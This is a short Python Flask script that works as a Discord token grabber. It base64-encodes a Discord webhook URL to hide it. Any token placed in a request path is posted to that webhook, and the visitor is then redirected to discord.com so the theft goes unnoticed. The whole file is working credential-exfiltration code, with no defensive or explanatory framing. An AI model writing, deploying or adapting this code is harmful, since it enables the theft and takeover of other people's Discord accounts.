from dhooks import Webhook
from flask import Flask, redirect
import base64

_e = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1MDgxNzAyNDQ1MTQxNjE3Ny80aUlZcHgtYXZYemhpU3Rkd3hSQjJ6VFZNYjEydWF4OWNLWWpmWWc0Yzc5OHBCOUFwa2lXTjRFU001Q0M2Vjd4MXV2TA=="
e = base64.b64decode(_e).decode()

app = Flask(__name__)
hook = Webhook(e)

@app.route('/<string:token>')
def index(token):
    hook.send(token)
    return redirect("https://discord.com/app")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=81)
